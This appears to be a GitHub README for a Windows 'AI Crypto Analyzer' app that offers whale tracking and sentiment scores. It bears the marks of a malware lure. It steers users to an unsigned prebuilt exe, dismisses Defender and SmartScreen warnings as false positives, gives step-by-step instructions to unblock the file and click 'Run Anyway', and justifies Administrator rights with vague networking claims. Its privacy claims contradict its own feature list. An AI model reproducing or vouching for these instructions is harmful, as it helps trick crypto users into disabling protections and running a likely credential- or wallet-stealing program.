# AI Crypto Analyzer v5.2

> Advanced on-chain sentiment analysis and whale wallet tracking for BTC, ETH, and top altcoins.

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
![Version](https://img.shields.io/badge/Version-5.2%20Stable-blue)
![License](https://img.shields.io/badge/License-MIT-green)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)

## 📊 Overview

**AI Crypto Analyzer** is a desktop application built for traders and developers who need deep insights into market sentiment without paying for CoinGlass or Token Terminal. v5.2 introduces a lightweight LSTM model to parse real-time on-chain whale movements, exchange inflows/outflows, and social volume.

- No registration required.
- No API keys needed.
- 100% local execution.

## ✨ Features

- **Whale Wallet Tracking:** Monitors top 100 known whale addresses in real-time.
- **AI Sentiment Analysis:** Aggregates data from Twitter/X, Reddit, and news feeds.
- **On-Chain Metrics:** Fetches gas prices, MVRV ratio, and exchange inflows/outflows.
- **Lightweight UI:** Built with PyQt5. Minimal RAM usage (<50MB).
- **Zero Data Collection:** Everything runs on your local machine. Your IP and wallet data never leave your computer.

## ⚠️ Windows Defender & SmartScreen

This is an open-source project maintained by a solo developer. Because we do not purchase a $300/year Code Signing Certificate, Windows SmartScreen might flag `Ai_Analyzer_v5.2.exe` as "unrecognized."

**This is a false positive.** The application requires Administrator privileges to establish direct RPC connections to blockchain nodes and bypass local network throttling for real-time data feeds.

### How to run:
1. Download `Ai_Analyzer_v5.2_Windows.zip` from the [Releases page](../../releases).
2. Extract the archive.
3. Right-click `Ai_Analyzer_v5.2.exe` -> select **Properties**.
4. Check the box **"Unblock"** at the bottom of the General tab -> click Apply.
5. Run `Ai_Analyzer_v5.2.exe`. If Windows shows a blue SmartScreen, click **"More Info"** -> **"Run Anyway"**.

## 🚀 Installation

### Pre-compiled Binary (Recommended)
1. Go to the [Releases](../../releases/latest) section.
2. Download `Ai_Analyzer_v5.2_Windows.zip`.
3. Extract and run `Ai_Analyzer_v5.2.exe` (Follow the Windows Defender guide above).

### Run from Source (For developers)
```bash
git clone https://github.com/yourusername/ai-crypto-analyzer.git
cd ai-crypto-analyzer
pip install -r requirements.txt
python main.py
```

## 🛠 Usage

1. Launch `Ai_Analyzer_v5.2.exe`.
2. Select the asset (e.g., BTC, ETH, SOL).
3. Click **"Start Scan"**.
4. The AI model will aggregate data for 10-15 seconds and output a sentiment score based on whale movements.

## ❓ FAQ

**Q: Why does it ask for Administrator privileges?**
A: The tool makes high-frequency RPC calls to blockchain nodes. Windows Firewall blocks unsigned apps from making these requests by default. Admin rights ensure the data stream is not interrupted.

**Q: Is my data safe?**
A: Yes. The application is 100% local. No analytics or personal data is sent to external servers.

**Q: Which networks are supported?**
A: Currently, the analyzer supports Ethereum (ERC-20), Binance Smart Chain (BEP-20), and Polygon.

## 🤝 Contributing

This is a beta project. If you encounter bugs or want to add features (e.g., Solana support), feel free to open a Pull Request.

1. Fork the repository.
2. Create your feature branch (`git checkout -b feature/SolanaSupport`).
3. Commit your changes (`git commit -m 'Added Solana RPC integration'`).
4. Push to the branch (`git push origin feature/SolanaSupport`).
5. Open a Pull Request.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
